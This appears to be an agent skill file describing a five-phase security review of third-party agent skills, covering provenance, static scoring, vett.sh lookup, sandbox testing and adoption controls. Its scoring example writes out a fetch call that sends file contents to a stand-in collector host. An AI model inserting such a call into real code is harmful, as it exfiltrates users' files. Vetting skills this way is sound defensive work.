---
name: workleap-skill-safety-review
description: >
  Evaluate third-party agent skills for security risks before adoption or update. Use when:
  (1) Installing or updating a skill from skills.sh, ClawHub, or any public registry,
  (2) Auditing skills for security risks or reviewing PRs that add/update skill dependencies,
  (3) Building a team/org allowlist of approved skills,
  (4) Investigating suspicious skill behavior or answering "is this skill safe?" / "should we adopt this skill?"
metadata:
  version: 1.3
---

# Agent Skill Safety Evaluation

Evaluate third-party agent skills for security risks before adoption. Follow the five-phase workflow below for every evaluation.

## Resolve the skill source

Before evaluating, locate the skill's source code. Skills from public registries follow the `{owner}/{repo}/{skill-name}` format.

**From skills.sh**: The skill page is at `https://skills.sh/{owner}/{repo}/{skill-name}`. The underlying GitHub repo is at `https://github.com/{owner}/{repo}`. Fetch the SKILL.md and all supporting files from the repo (look for a directory matching the skill name, or check common structures like `skills/{skill-name}/`, `plugins/**/skills/{skill-name}/`).

**From a local installation**: If the skill is already installed, inspect the files in `.claude/skills/{skill-name}/` or the project's configured skill directory.

**From a PR**: If reviewing a pull request that adds a skill, inspect the diff for the added SKILL.md and all supporting files.

## Evaluation workflow

Follow these phases in order:

1. Provenance gate (pass/fail -- reject immediately on failure)
2. Static content analysis (scored 0-100, CRITICAL findings auto-reject)
3. Third-party verification (check vett.sh)
4. Behavioral analysis (only for borderline scores 60-80)
5. Produce final verdict and operational controls

## Phase 1: Provenance gate

Check these criteria. **Fail any one = REJECT the skill immediately.**

| Check | Pass criteria |
|---|---|
| Author identity | Verify the author is a known organization (Anthropic, Vercel, Microsoft, Google, etc.) OR a verified individual with established open-source history (account >2 years, >5 public repos with external contributors, visible community engagement) |
| Source repository | Confirm the skill source is a public GitHub/GitLab repo with visible commit history, issues, and contributors |
| Known malicious actors | Confirm the author is NOT on the known threat actor list. See [references/known-threats.md](references/known-threats.md) |
| Age and stability | Confirm the skill repo was created >30 days ago with >10 commits over at least 2 weeks |

**Trusted publishers** (skip the Author identity check only; other checks still apply): `anthropics`, `vercel`, `vercel-labs`, `microsoft`, `google-labs-code`, `google-gemini`, `github`, `antfu`, `addyosmani`, `remotion-dev`.

## Phase 2: Static content analysis

Inspect ALL files in the skill directory (the directory containing SKILL.md and its subdirectories). Apply the checklist in [references/static-analysis-checklist.md](references/static-analysis-checklist.md). Start at 100 points; deduct per finding.

**Hard rule: Any CRITICAL-severity finding triggers automatic REJECT regardless of the numerical score, unless the finding falls into a documented benign exception.** The three CRITICAL checks are: (1) hidden instructions in HTML comments, (2) obfuscated content, (3) sensitive file access.

**Scoring thresholds (when no CRITICAL findings):**

- Score > 80: PROCEED to Phase 3 verification
- Score 60-80: PROCEED to Phase 3, then REQUIRE Phase 4 behavioral analysis
- Score < 60: **REJECT**

**Example:** A skill contains `fetch("https://collector.example.com", { body: fileContent })` in an unreferenced helper.js. Deduct -15 (network access) and -15 (unreferenced file). Score: 70/100. PROCEED to Phase 3, then REQUIRE Phase 4.

## Phase 3: Third-party verification

Look up the skill on [vett.sh](https://vett.sh) and retrieve its risk score. Search at `https://vett.sh` or try `https://vett.sh/skills/{owner}/{repo}/{skill-name}`.

**Interpret vett.sh results:**

| Vett.sh risk score | Action |
|---|---|
| 0-15 (None/Low) | No additional concerns. PROCEED based on Phase 2 score |
| 16-40 (Medium) | Review the specific findings. If findings are example-only patterns (env vars in test code fences, fetch in documentation), acceptable. If findings appear in imperative instructions or executable files (.sh, .py, .js), escalate to Phase 4 |
| 41+ (Critical/BLOCKED) | **REJECT** regardless of Phase 2 score. For trusted publishers only: review and justify each finding before overriding |

**Fallback:** If vett.sh is unavailable or has no record of the skill, treat it as Medium risk (16-40) and require Phase 4 behavioral analysis regardless of Phase 2 score.

## Phase 4: Behavioral analysis

Perform behavioral analysis when the Phase 2 score is 60-80, when Phase 3 raises medium-risk concerns, or when vett.sh is unavailable.

**Note:** This phase typically requires human intervention. Instruct the user to perform these steps in a sandboxed environment:

1. **Sandbox dry-run**: Install the skill in an isolated environment (devcontainer, VM) with no real credentials. Invoke it and monitor all file system access, network requests, and command execution.
2. **Network monitoring**: Run with traffic capture. Flag any outbound connections not required by the skill's stated purpose.
3. **File access audit**: Monitor which files the skill reads/writes. Flag access outside the project directory.
4. **Diff against known-good version**: If updating an existing skill, diff new vs. old. Flag any new network calls, file access, or permission changes.

## Phase 5: Final verdict

Determine the verdict:

- **SAFE**: Phase 1 passed, Phase 2 score > 80 with no CRITICAL findings, Phase 3 score 0-15, no Phase 4 required or Phase 4 clean
- **NEEDS REVIEW**: Phase 2 score 60-80, or vett.sh Medium with unresolved findings, or Phase 4 inconclusive
- **REJECT**: Phase 1 failed, any CRITICAL finding without benign exception, Phase 2 score < 60, or vett.sh 41+

**You MUST load and follow the report template** in [references/evaluation-report.md](references/evaluation-report.md). Do not produce a freeform report.

## Operational controls for adopted skills

Apply these controls to every adopted third-party skill:

1. **Pin to specific commit SHA** -- never use `latest` or branch references
2. **Restrict allowed-tools** -- verify that `allowed-tools` is minimally scoped
3. **Credential isolation** -- never run skills in environments with production credentials, SSH keys, or cloud provider tokens
4. **Periodic re-evaluation** -- re-run Phase 2 checks on every update. Frequency based on initial score: >90 quarterly, 80-90 monthly, 60-80 bi-weekly
5. **Prefer trusted publisher skills** -- strongly prefer skills from trusted publishers over community skills
6. **Minimize skill count** -- fewer skills = smaller attack surface and less context bloat
7. **Audit agent memory** -- periodically check `.claude/` directories for unauthorized modifications

## Reference Guide

For detailed analysis checklists and threat intelligence, consult:

- **`references/static-analysis-checklist.md`** — All 11 static analysis checks with severity, detection patterns, and benign exceptions
- **`references/known-threats.md`** — Known malicious actors, attack vectors beyond static analysis, and key security research
- **`references/evaluation-report.md`** — Report template for Phase 5 output and structured evaluation format
